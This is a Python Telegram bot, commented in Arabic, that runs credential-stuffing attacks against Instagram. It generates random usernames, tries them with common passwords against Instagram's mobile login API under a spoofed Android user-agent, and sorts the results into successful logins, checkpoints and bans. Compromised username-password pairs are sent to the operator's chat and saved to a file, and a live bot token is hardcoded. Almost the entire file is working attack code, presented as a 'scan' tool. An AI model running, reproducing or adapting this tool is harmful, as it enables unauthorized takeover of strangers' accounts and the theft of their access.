import requests
import random
import time
import logging
import threading
from uuid import uuid4
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime

# إعدادات التسجيل
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# حالة البوت
class BotState:
    def __init__(self):
        self.is_running = False
        self.thread = None
        self.attempts = 0
        self.successful = 0
        self.failed = 0
        self.banned = 0
        self.checkpoints = 0
        self.status_message_id = None
        self.last_update = time.time()
        self.max_attempts = 500  # الحد الأقصى للمحاولات لكل عملية فحص
        self.current_attempts = 0  # عدد المحاولات في العملية الحالية

bot_state = BotState()

# كلمات المرور الشائعة
COMMON_PASSWORDS = [
    '1122334455', 'Aa123123', 'Aa123456', '12341234', 'qwer1234',
    '1234qwer', '123498765', '123456789', '11335566', 'password',
    '12345678', '111111', 'abc123', 'admin', 'letmein', '123123',
    'aa123456', 'password1', '123456a', '1234567', '11111111',
    'abc123456', '1234567890', '12345678910', 'qwerty123', '1q2w3e4r',
    'iloveyou', 'sunshine', 'princess', 'welcome', 'football',
]

# رموز مؤشر التقدم
PROGRESS_ICONS = ['🔄', '⚡', '🔍', '📡', '🚀', '🔦', '📶', '🛰️']
LOADING_BARS = ['▏', '▎', '▍', '▌', '▋', '▊', '▉', '█']

# إنشاء أسماء مستخدمين عشوائية
def generate_username(length=4):
    chars = '1q2w3e4r5t6y7u8i9o0plmknjbhvgcfxdzsa'
    return ''.join(random.choice(chars) for _ in range(length))

# محاولة تسجيل الدخول
def attempt_login():
    username = generate_username()
    password = random.choice(COMMON_PASSWORDS)
    
    headers = {
        'Host': 'i.instagram.com',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'Accept-Language': 'en-US',
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'
    }
    
    device_id = str(uuid4())
    data = {
        'login_attempt_count': '0',
        '_csrftoken': 'missing',
        'from_reg': 'false',
        'device_id': device_id,
        'username': username,
        'password': password,
        'uuid': device_id
    }
    
    try:
        response = requests.post(
            'https://i.instagram.com/api/v1/accounts/login/',
            headers=headers,
            data=data,
            timeout=10
        )
        
        return username, password, response.text
    except Exception as e:
        return username, password, f"error: {str(e)}"

# معالجة النتائج
def process_result(username, password, response_text):
    bot_state.attempts += 1
    bot_state.current_attempts += 1
    
    if 'rate_limit_error' in response_text:
        bot_state.banned += 1
        return "banned", f"تم حظر الحساب: {username}:{password}"
    elif 'bad_password' in response_text:
        bot_state.failed += 1
        return "bad_password", f"كلمة مرور خاطئة: {username}:{password}"
    elif 'checkpoint_challenge_required' in response_text:
        bot_state.checkpoints += 1
        return "checkpoint", f"حساب يحتاج التحقق: {username}:{password}"
    elif 'logged_in_user' in response_text:
        bot_state.successful += 1
        return "success", f"تم الدخول بنجاح: {username}:{password}"
    else:
        bot_state.failed += 1
        return "unknown", f"استجابة غير معروفة: {username}:{password}"

# إنشاء مؤشر تقدم مرئي
def create_progress_bar(progress, total=20):
    filled = int(progress * total / 100)
    empty = total - filled
    return '█' * filled + '░' * empty

# إنشاء رسالة الحالة مع مؤشر التقدم
def create_status_message():
    progress_icon = PROGRESS_ICONS[int(time.time() * 2) % len(PROGRESS_ICONS)]
    loading_bar = LOADING_BARS[int(time.time() * 4) % len(LOADING_BARS)]
    
    # حساب النسبة المئوية للتقدم بناءً على المحاولات الحالية والحد الأقصى
    progress_percent = min(100, (bot_state.current_attempts / bot_state.max_attempts) * 100)
    
    status_text = (
        f"{progress_icon} **جاري الفحص النشط** {progress_icon}\n\n"
        f"**مؤشر التقدم:** [{create_progress_bar(progress_percent)}] {progress_percent:.1f}%\n"
        f"**المحاولات:** {bot_state.current_attempts}/{bot_state.max_attempts}\n"
        f"**آخر تحديث:** {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"**📊 الإحصائيات الحية:**\n"
        f"• 🔍 المحاولات: `{bot_state.attempts}`\n"
        f"• ✅ نجحت: `{bot_state.successful}`\n"
        f"• ❌ فشلت: `{bot_state.failed}`\n"
        f"• 🚫 محظورة: `{bot_state.banned}`\n"
        f"• ⚠️ تحتاج تحقق: `{bot_state.checkpoints}`\n\n"
        f"{loading_bar} **جاري الفحص...** {loading_bar}"
    )
    return status_text

# تحديث رسالة الحالة
def update_status_message(chat_id):
    if bot_state.status_message_id:
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=bot_state.status_message_id,
                text=create_status_message(),
                parse_mode='Markdown'
            )
        except:
            # إذا فشل التحديث، نعيد إنشاء الرسالة
            bot_state.status_message_id = None

# إعادة تعيين إحصائيات الفحص الحالي
def reset_current_scan():
    bot_state.current_attempts = 0
    # لا نعيد تعيين الإحصائيات العامة، فقط محاولات الفحص الحالي

# دورة العمل الرئيسية
def attack_worker(chat_id):
    # إرسال رسالة الحالة الأولى
    status_msg = bot.send_message(chat_id, create_status_message(), parse_mode='Markdown')
    bot_state.status_message_id = status_msg.message_id
    
    while bot_state.is_running and bot_state.current_attempts < bot_state.max_attempts:
        username, password, response_text = attempt_login()
        status, message = process_result(username, password, response_text)
        
        # تحديث رسالة الحالة كل 3 ثواني أو عند نتائج مهمة
        current_time = time.time()
        if (current_time - bot_state.last_update > 3) or status in ["banned", "checkpoint", "success"]:
            update_status_message(chat_id)
            bot_state.last_update = current_time
        
        # إرسال النتائج المهمة فقط إلى التليجرام
        if status in ["banned", "checkpoint", "success"]:
            try:
                icon = "🚫" if status == "banned" else "⚠️" if status == "checkpoint" else "✅"
                bot.send_message(chat_id, f"{icon} {message}")
            except Exception as e:
                logger.error(f"فشل في إرسال الرسالة: {e}")
        
        # تسجيل جميع النتائج في الملف
        with open('instagram_results.txt', 'a', encoding='utf-8') as f:
            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")
        
        # وقت انتظار عشوائي بين المحاولات
        time.sleep(random.uniform(1, 2))
    
    # عند اكتمال الفحص أو التوقف، تحديث رسالة الحالة النهائية
    if bot_state.current_attempts >= bot_state.max_attempts:
        final_text = (
            "🎉 **تم الانتهاء من الفحص بنجاح!**\n\n"
            f"**نتائج هذه الجولة ({bot_state.max_attempts} محاولة):**\n"
            f"• ✅ نجحت: `{bot_state.successful - (bot_state.successful - sum([1 for line in open('instagram_results.txt', 'r', encoding='utf-8') if 'تم الدخول بنجاح' in line]))}`\n"
            f"• 🚫 محظورة: `{bot_state.banned - (bot_state.banned - sum([1 for line in open('instagram_results.txt', 'r', encoding='utf-8') if 'تم حظر الحساب' in line]))}`\n"
            f"• ⚠️ تحتاج تحقق: `{bot_state.checkpoints - (bot_state.checkpoints - sum([1 for line in open('instagram_results.txt', 'r', encoding='utf-8') if 'حساب يحتاج التحقق' in line]))}`\n\n"
            f"**📊 الإحصائيات الإجمالية:**\n"
            f"• 🔍 إجمالي المحاولات: `{bot_state.attempts}`\n"
            f"• ✅ نجحت: `{bot_state.successful}`\n"
            f"• ❌ فشلت: `{bot_state.failed}`\n"
            f"• 🚫 محظورة: `{bot_state.banned}`\n"
            f"• ⚠️ تحتاج تحقق: `{bot_state.checkpoints}`\n\n"
            "💤 انقر على 🔄 إعادة الفحص لبدء جولة جديدة"
        )
    else:
        final_text = (
            "⏹️ **تم إيقاف الفحص**\n\n"
            f"**نتائج هذه الجولة ({bot_state.current_attempts} محاولة):**\n"
            f"• ✅ نجحت: `{bot_state.successful - (bot_state.successful - sum([1 for line in open('instagram_results.txt', 'r', encoding='utf-8') if 'تم الدخول بنجاح' in line]))}`\n"
            f"• 🚫 محظورة: `{bot_state.banned - (bot_state.banned - sum([1 for line in open('instagram_results.txt', 'r', encoding='utf-8') if 'تم حظر الحساب' in line]))}`\n"
            f"• ⚠️ تحتاج تحقق: `{bot_state.checkpoints - (bot_state.checkpoints - sum([1 for line in open('instagram_results.txt', 'r', encoding='utf-8') if 'حساب يحتاج التحقق' in line]))}`\n\n"
            "💤 انقر على 🔄 إعادة الفحص لبدء جولة جديدة"
        )
    
    try:
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=bot_state.status_message_id,
            text=final_text,
            parse_mode='Markdown',
            reply_markup=create_scan_complete_keyboard()
        )
    except:
        pass
    
    # إعادة تعيين حالة الفحص
    bot_state.is_running = False

# إنشاء لوحة المفاتيح الرئيسية
def create_main_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.row_width = 2
    keyboard.add(
        InlineKeyboardButton("▶️ بدء الفحص", callback_data='start_attack'),
        InlineKeyboardButton("⏹ إيقاف الفحص", callback_data='stop_attack'),
        InlineKeyboardButton("📊 الإحصائيات", callback_data='stats'),
        InlineKeyboardButton("🔄 تحديث", callback_data='refresh'),
        InlineKeyboardButton("❌ إغلاق", callback_data='close')
    )
    return keyboard

# إنشاء لوحة المفاتيح بعد اكتمال الفحص
def create_scan_complete_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.row_width = 2
    keyboard.add(
        InlineKeyboardButton("🔄 إعادة الفحص", callback_data='rescan'),
        InlineKeyboardButton("📊 الإحصائيات", callback_data='stats'),
        InlineKeyboardButton("📋 النتائج الكاملة", callback_data='full_results'),
        InlineKeyboardButton("❌ إغلاق", callback_data='close')
    )
    return keyboard

# تهيئة البوت - استبدل YOUR_BOT_TOKEN بتوكن البوت الخاص بك
bot = telebot.TeleBot("861291987:AAEMV85dd8g42_51wMFEMx1j-AZyvJY7AwY")

# معالجة الأمر /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "🛡️ **مرحباً في بوت فحص إنستجرام المتقدم**\n\n"
        "يمكنك بدء فحص الحسابات العشوائية ومشاهدة النتائج مباشرة.\n\n"
        "🎯 **الميزات:**\n"
        "• فحص تلقائي لـ 500 حساب في كل جولة\n"
        "• مؤشر تقدم حي\n"
        "• إحصائيات مباشرة\n"
        "• إشعارات بالنتائج المهمة\n"
        "• إعادة الفحص بضغطة زر\n\n"
        "انقر على ▶️ بدء الفحص للبدء!"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=create_main_keyboard(), parse_mode='Markdown')

# معالجة الأمر /help
@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = (
        "🎯 **أوامر البوت:**\n\n"
        "▶️ /start - بدء البوت وعرض القائمة الرئيسية\n"
        "📊 /stats - عرض إحصائيات الفحص\n"
        "⏹ /stop - إيقاف الفحص الحالي\n"
        "🔄 /rescan - إعادة الفحص من جديد\n"
        "❓ /help - عرض هذه الرسالة\n\n"
        "💡 **طريقة العمل:**\n"
        "1. انقر على ▶️ بدء الفحص\n"
        "2. شاهد مؤشر التقدم والإحصائيات\n"
        "3. ستصل إشعارات بالنتائج المهمة\n"
        "4. بعد 500 محاولة، يمكنك إعادة الفحص\n\n"
        "⚡ **ملاحظة:** البوت يصنع أسماء مستخدمين عشوائية ويختبرها ضد كلمات مرور شائعة"
    )
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown')

# معالجة الأمر /stats
@bot.message_handler(commands=['stats'])
def send_stats(message):
    stats_text = (
        f"📊 **إحصائيات الفحص:**\n\n"
        f"• 🔍 إجمالي المحاولات: `{bot_state.attempts}`\n"
        f"• ✅ نجحت: `{bot_state.successful}`\n"
        f"• ❌ فشلت: `{bot_state.failed}`\n"
        f"• 🚫 محظورة: `{bot_state.banned}`\n"
        f"• ⚠️ تحتاج تحقق: `{bot_state.checkpoints}`\n"
        f"• 🎯 الحالة: `{'نشط' if bot_state.is_running else 'متوقف'}`\n"
        f"• 📈 المحاولات في هذه الجولة: `{bot_state.current_attempts}/{bot_state.max_attempts}`\n\n"
        f"⏰ آخر تحديث: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    bot.send_message(message.chat.id, stats_text, parse_mode='Markdown')

# معالجة الأمر /stop
@bot.message_handler(commands=['stop'])
def stop_attack(message):
    if bot_state.is_running:
        bot_state.is_running = False
        if bot_state.thread and bot_state.thread.is_alive():
            bot_state.thread.join(timeout=1.0)
        bot.send_message(message.chat.id, "⏹️ **تم إيقاف الفحص بنجاح!**", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "⚠️ **لا يوجد فحص نشط حالياً!**", parse_mode='Markdown')

# معالجة الأمر /rescan
@bot.message_handler(commands=['rescan'])
def rescan_command(message):
    reset_current_scan()
    if not bot_state.is_running:
        bot_state.is_running = True
        bot.send_message(message.chat.id, "🔄 **بدء جولة فحص جديدة!**", parse_mode='Markdown')
        
        # بدء الفحص في خلفية منفصلة
        bot_state.thread = threading.Thread(target=attack_worker, args=(message.chat.id,))
        bot_state.thread.daemon = True
        bot_state.thread.start()
    else:
        bot.send_message(message.chat.id, "⚠️ **يوجد فحص نشط بالفعل!**", parse_mode='Markdown')

# معالجة الأزرار
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == 'start_attack':
        if not bot_state.is_running:
            reset_current_scan()
            bot_state.is_running = True
            bot.answer_callback_query(call.id, "✅ بدأ الفحص بنجاح!")
            
            # بدء الفحص في خلفية منفصلة
            bot_state.thread = threading.Thread(target=attack_worker, args=(call.message.chat.id,))
            bot_state.thread.daemon = True
            bot_state.thread.start()
        else:
            bot.answer_callback_query(call.id, "⚠️ الفحص يعمل بالفعل!")
    
    elif call.data == 'stop_attack':
        if bot_state.is_running:
            bot_state.is_running = False
            if bot_state.thread and bot_state.thread.is_alive():
                bot_state.thread.join(timeout=1.0)
            bot.answer_callback_query(call.id, "⏹️ توقف الفحص بنجاح!")
        else:
            bot.answer_callback_query(call.id, "⚠️ لا يوجد فحص نشط!")
    
    elif call.data == 'stats':
        stats_text = (
            f"📊 **إحصائيات الفحص:**\n\n"
            f"• 🔍 إجمالي المحاولات: `{bot_state.attempts}`\n"
            f"• ✅ نجحت: `{bot_state.successful}`\n"
            f"• ❌ فشلت: `{bot_state.failed}`\n"
            f"• 🚫 محظورة: `{bot_state.banned}`\n"
            f"• ⚠️ تحتاج تحقق: `{bot_state.checkpoints}`\n"
            f"• 🎯 الحالة: `{'نشط' if bot_state.is_running else 'متوقف'}`\n"
            f"• 📈 المحاولات في هذه الجولة: `{bot_state.current_attempts}/{bot_state.max_attempts}`\n\n"
            f"⏰ آخر تحديث: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        bot.send_message(call.message.chat.id, stats_text, parse_mode='Markdown')
        bot.answer_callback_query(call.id)
    
    elif call.data == 'refresh':
        if bot_state.is_running:
            update_status_message(call.message.chat.id)
            bot.answer_callback_query(call.id, "🔄 تم تحديث الإحصائيات!")
        else:
            send_stats(call.message)
            bot.answer_callback_query(call.id)
    
    elif call.data == 'rescan':
        reset_current_scan()
        if not bot_state.is_running:
            bot_state.is_running = True
            bot.answer_callback_query(call.id, "🔄 بدء جولة فحص جديدة!")
            
            # بدء الفحص في خلفية منفصلة
            bot_state.thread = threading.Thread(target=attack_worker, args=(call.message.chat.id,))
            bot_state.thread.daemon = True
            bot_state.thread.start()
        else:
            bot.answer_callback_query(call.id, "⚠️ يوجد فحص نشط بالفعل!")
    
    elif call.data == 'full_results':
        try:
            with open('instagram_results.txt', 'r', encoding='utf-8') as f:
                lines = f.readlines()
                if lines:
                    # إرسال آخر 10 نتائج فقط لتجنب overflow
                    recent_results = "📋 **آخر 10 نتائج:**\n\n" + "\n".join(lines[-10:])
                    bot.send_message(call.message.chat.id, recent_results, parse_mode='Markdown')
                else:
                    bot.send_message(call.message.chat.id, "📭 لا توجد نتائج حتى الآن.")
        except FileNotFoundError:
            bot.send_message(call.message.chat.id, "📭 لم يبدأ الفحص بعد أو لا توجد نتائج.")
        bot.answer_callback_query(call.id)
    
    elif call.data == 'close':
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        bot.answer_callback_query(call.id, "تم إغلاق القائمة.")

# تشغيل البوت
if __name__ == '__main__':
    print("🤖 البوت يعمل الآن...")
    print("💡 اذهب إلى تليجرام وأرسل /start للبدء")
    bot.infinity_polling()